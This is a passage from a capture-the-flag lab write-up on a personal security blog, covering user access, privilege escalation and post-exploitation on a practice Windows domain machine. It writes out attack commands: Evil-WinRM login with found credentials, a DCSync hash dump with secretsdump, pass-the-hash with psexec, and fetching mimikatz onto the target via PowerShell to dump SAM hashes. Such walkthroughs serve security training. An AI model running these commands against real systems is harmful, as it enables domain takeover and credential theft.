Sheffield19</li></ul><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/05/image-61.png" class="kg-image" alt width="508" height="288" layout="responsive"></amp-img></figure><p>Now since we have the username and password, we can use <a href="https://github.com/Hackplayers/evil-winrm" rel="noopener noreferrer">Evil-WinRM</a> tool. You can simply install it by typing <code>gem install evil-winrm</code> and hit enter, then the tool will be installed to your machine. üòéüòé</p><p>Now, Don't you have a question ‚ùì We already have the username and password for user <strong>sandra</strong>. Why didn't we use it? It's because there is nothing inside that account. It's just a simple user account.</p><p>Let's run the tool for <code>svc_bes</code> account.</p><pre><code class="language-bash">evil-winrm -u svc_bes -p Sheffield19 -i 10.10.10.30
</code></pre><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/05/image-62.png" class="kg-image" alt width="569" height="205" layout="responsive"></amp-img></figure><p>So we got the user flag. Now, time to <strong>escalate privileges</strong>.</p><hr></hr><h2 id="03-privilege-escalation">03. Privilege Escalation</h2><p>Now we are going to perform <a href="https://www.qomplx.com/kerberos_dcsync_attacks_explained/" rel="noopener noreferrer">DCSync attack</a> and dump the NTLM hashes of all domain users using the Impacket's <a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/secretsdump.py" rel="noopener noreferrer">secretsdump.py </a>script. üòàüòà Let's try it</p><pre><code class="language-bash"> /usr/share/doc/python3-impacket/examples/secretsdump.py MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30</code></pre><p>Here is the output. üëáüëá</p><figure class="kg-card kg-image-card kg-card-hascaption"><amp-img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaFHcLpM7vaCNtrd5wF%2F-MaFNNHT8ij_UjXd4Vsa%2Fimage.png?alt=media&amp;token=812cb165-e2ee-4b77-8ad7-9f606011a238" class="kg-image" alt width="1046" height="523" layout="responsive"></amp-img><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><div><div>Enter a caption for this image (optional)</div></div></span></figcaption></figure><p><br />As you can see, We have NTLM hash for the Administrator account. We can use this to perform <strong><strong><a href="https://en.wikipedia.org/wiki/Pass_the_hash">Pass The Hash attack</a></strong></strong> and gain elevated access to the system. Also we can use Impacket's<a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py" rel="noopener noreferrer"> psexec.py</a> for this too.</p><p>See how ¬†<a href="https://github.com/SecureAuthCorp/impacket" rel="noopener noreferrer">impacket</a> ¬†helps us during this machine. Give respect to the <a href="https://www.secureauth.com/" rel="noopener noreferrer">SecureAuth Corporation</a>. üôã‚Äç‚ôÇÔ∏èüôã‚Äç‚ôÇÔ∏è</p><h3 id="031-perform-pass-the-hash-attack">03.1 Perform Pass The Hash Attack</h3><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/05/image-87.png" class="kg-image" alt width="225" height="225" layout="fixed"></amp-img></figure><p>First, copy the above Administrator's hash without triple colon (:::) at the end and then type this.</p><pre><code class="language-bash">/usr/share/doc/python3-impacket/examples/psexec.py MEGACORP.LOCAL/Administrator@10.10.10.30 -hashes &lt;NTML hash&gt;</code></pre><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/05/image-63.png" class="kg-image" alt width="1880" height="564" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/05/image-63.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/05/image-63.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/05/image-63.png 1600w, https://h4rithd.com/blog/content/images/2021/05/image-63.png 1880w" layout="responsive"></amp-img></figure><p><br />We got the root flag too!!. üßêüßê</p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/05/image-64.png" class="kg-image" alt width="845" height="762" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/05/image-64.png 600w, https://h4rithd.com/blog/content/images/2021/05/image-64.png 845w" layout="responsive"></amp-img></figure><hr></hr><h3 id="04-post-exploitation">04. Post Exploitation</h3><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/05/image-88.png" class="kg-image" alt width="225" height="225" layout="fixed"></amp-img></figure><p>Since these boxes are all connected, we are going to grab the local admin hash too. So let‚Äôs upload <a href="https://github.com/gentilkiwi/mimikatz/wiki" rel="noopener noreferrer">mimikatz.</a> You can download ¬†<code>mimikatz</code> tool from <a href="https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210512/mimikatz_trunk.zip" rel="noopener noreferrer">here</a> and upload it to the box using python demon web server.</p><pre><code class="language-bash">wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210512/mimikatz_trunk.zip &amp;&amp; unzip mimikatz_trunk.zip &amp;&amp; cd x64 &amp;&amp; python3 -m http.server</code></pre><pre><code class="language-bash">powershell.exe -c "IWR -useBasicParsing http://&lt;YourIP&gt;:8000/mimikatz.exe -o mcat.exe"</code></pre><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/05/image-65.png" class="kg-image" alt width="1249" height="917" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/05/image-65.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/05/image-65.png 1000w, https://h4rithd.com/blog/content/images/2021/05/image-65.png 1249w" layout="responsive"></amp-img></figure><p>Then we can run that file by typing <code>.\mcat</code> And then run the <code>lsadump::sam</code> command.</p><figure class="kg-card kg-image-card kg-card-hascaption"><amp-img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaFPGC9ij8JayLKr9eX%2F-MaFVUjWTVrs7MfwbN4e%2Fimage.png?alt=media&amp;token=4b7381e5-b523-4a4a-88d5-dc45afc5c074" class="kg-image" alt width="749" height="543" layout="responsive"></amp-img><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><div><div>Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Here is the hash : 7facdc498ed1680c4fd1448319a8c04f</p><p>You can decode it through the <a href="https://crackstation.net/" rel="noopener noreferrer">crackstation </a>site.</p><figure class="kg-card kg-image-card kg-card-hascaption"><amp-img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaFVfK7TEHx4qpr0UnI%2F-MaFX51eTjy22bDTPq1y%2Fimage.png?alt=media&amp;token=9968dc48-bcc7-4baf-b418-114c36f1ef37" class="kg-image" alt width="1349" height="445" layout="responsive"></amp-img><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><div><div>Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>The password is : <code>Password!</code></p><p>Finally we are done. and from here you must have <strong>VIP or VIP+</strong> ¬†membership to play with other boxes.</p><p>Okay... I‚Äôll see you on the next box! üôã‚Äç‚ôÇÔ∏èüôã‚Äç‚ôÇÔ∏è</p><figure class="kg-card kg-image-card kg-card-hascaption"><amp-img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaFYGcfEGWqroDWh_E5%2F-MaFYJtpWXyxsXv3xc10%2Fimage.png?alt=media&amp;token=0763dbb9-6089-45de-b213-2139fcad6de3" class="kg-image" alt width="389" height="241" layout="responsive"></amp-img><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><div><div>Enter a caption for this image (optional)</div></div></span></figcaption></figure><p><br /><strong><strong>Find me on </strong></strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>

            </section>

        </article>
    </main>
    <footer class="page-footer">
            <amp-img class="site-icon" src="https://h4rithd.com/blog/content/images/2021/05/hnet.com-image.ico" width="50" height="50" layout="fixed"></amp-img>
        <h3>h4rithd.com</h3>
            <p>Penetration Tester | Ethical Hacker | Security Researcher</p>
        <p><a href="../../index.html">Read more posts ‚Üí</a></p>
        <a class="powered" href="https://ghost.org" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 156 156"><g fill="none" fill-rule="evenodd"><rect fill="#15212B" width="156" height="156" rx="27"/><g transform="translate(36 36)" fill="#F6F8FA"><path d="M0 71.007A4.004 4.004 0 014 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0130 84H4a4 4 0 01-4-4.007v-8.986zM50 71.007A4.004 4.004 0 0154 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0180 84H54a4 4 0 01-4-4.007v-8.986z"/><rect y="34" width="84" height="17" rx="4"/><path d="M0 4.007A4.007 4.007 0 014.007 0h41.986A4.003 4.003 0 0150 4.007v8.986A4.007 4.007 0 0145.993 17H4.007A4.003 4.003 0 010 12.993V4.007z"/><rect x="67" width="17" height="17" rx="4"/></g></g></svg> Published with Ghost</a>
    </footer>
    
</body>
</html>
